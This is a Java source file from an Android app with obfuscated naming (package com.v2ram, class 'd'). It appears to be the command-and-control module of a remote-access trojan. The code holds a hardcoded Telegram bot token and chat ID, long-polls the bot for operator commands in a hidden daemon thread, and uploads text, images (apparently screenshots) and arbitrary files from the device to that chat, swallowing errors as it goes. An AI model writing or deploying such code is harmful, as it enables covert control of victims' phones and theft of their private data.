// language: Java, file: d.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.concurrent.TimeUnit;

import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class d {

    static final String TOKEN = "8911830422:AAFQrJBp1S4vkk-6cIvG1zcIIjbXvIwwywg";
    static final String CHAT_ID = "8916400546";
    static final String BASE = "https://api.telegram.org/bot" + TOKEN + "/";

    static final OkHttpClient HTTP = new OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(40, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build();

    static volatile Context ctx;
    static volatile long lastUpdate = 0;
    static volatile boolean running = false;
    static volatile Thread poller;
    static volatile long lastBeat = System.currentTimeMillis();

    public static void start(Context c) {
        ctx = c.getApplicationContext();
        if (running) return;
        running = true;
        poller = new Thread(d::pollLoop, "v2-poll");
        poller.setDaemon(true);
        poller.start();
    }

    public static void restart() {
        try { if (poller != null) poller.interrupt(); } catch (Throwable ignored) {}
        running = false;
        start(ctx);
    }

    public static boolean isAlive(long thresholdMs) {
        return System.currentTimeMillis() - lastBeat < thresholdMs;
    }

    static void pollLoop() {
        while (running) {
            try {
                long t0 = System.currentTimeMillis();
                String url = BASE + "getUpdates?offset=" + (lastUpdate + 1)
                    + "&timeout=25&allowed_updates=[\"message\"]";
                Request req = new Request.Builder().url(url).get().build();
                Response resp = HTTP.newCall(req).execute();
                lastBeat = System.currentTimeMillis();
                if (!resp.isSuccessful()) { resp.close(); sleep(3000); continue; }
                String body = resp.body() != null ? resp.body().string() : "";
                resp.close();

                JSONObject j = new JSONObject(body);
                JSONArray arr = j.optJSONArray("result");
                if (arr == null) { sleep(500); continue; }

                for (int i = 0; i < arr.length(); i++) {
                    JSONObject u = arr.getJSONObject(i);
                    lastUpdate = u.optLong("update_id", lastUpdate);
                    JSONObject msg = u.optJSONObject("message");
                    if (msg == null) continue;
                    String chat = msg.optJSONObject("chat") != null
                        ? msg.getJSONObject("chat").optString("id", "")
                        : "";
                    if (!CHAT_ID.equals(chat)) continue;
                    String text = msg.optString("text", "");
                    if (text.isEmpty()) continue;
                    e.dispatch(text);
                }
                long took = System.currentTimeMillis() - t0;
                sleep(took < 300 ? 300 : 50);
            } catch (Throwable t) {
                Log.w("v2", "poll: " + t.getMessage());
                sleep(5000);
            }
        }
    }

    public static void send(String text) {
        if (ctx == null || text == null) return;
        for (String chunk : chunk(text, 3900)) {
            try {
                RequestBody b = new FormBody.Builder()
                    .add("chat_id", CHAT_ID)
                    .add("text", chunk)
                    .add("parse_mode", "HTML")
                    .add("disable_web_page_preview", "true")
                    .build();
                Request r = new Request.Builder()
                    .url(BASE + "sendMessage").post(b).build();
                HTTP.newCall(r).execute().close();
            } catch (Throwable ignored) {}
        }
    }

    public static void sendPhoto(String base64Jpeg) {
        if (ctx == null || base64Jpeg == null) return;
        try {
            byte[] raw = android.util.Base64.decode(base64Jpeg, android.util.Base64.DEFAULT);
            File f = new File(ctx.getCacheDir(), "s_" + System.currentTimeMillis() + ".jpg");
            java.io.FileOutputStream fo = new java.io.FileOutputStream(f);
            fo.write(raw); fo.close();

            MultipartBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", "s.jpg",
                    RequestBody.create(f, MediaType.parse("image/jpeg")))
                .build();
            Request r = new Request.Builder()
                .url(BASE + "sendPhoto").post(body).build();
            HTTP.newCall(r).execute().close();
            f.delete();
        } catch (Throwable t) { send("<i>photo err:</i> " + esc(t.getMessage())); }
    }

    public static void sendFile(File f, String displayName) {
        if (ctx == null || f == null || !f.exists()) return;
        try {
            MultipartBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", displayName,
                    RequestBody.create(f, MediaType.parse("application/octet-stream")))
                .build();
            Request r = new Request.Builder()
                .url(BASE + "sendDocument").post(body).build();
            HTTP.newCall(r).execute().close();
        } catch (Throwable t) { send("<i>file err:</i> " + esc(t.getMessage())); }
    }

    static String[] chunk(String s, int n) {
        if (s.length() <= n) return new String[] { s };
        int count = (s.length() + n - 1) / n;
        String[] out = new String[count];
        for (int i = 0; i < count; i++)
            out[i] = s.substring(i * n, Math.min(s.length(), (i + 1) * n));
        return out;
    }

    public static String esc(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}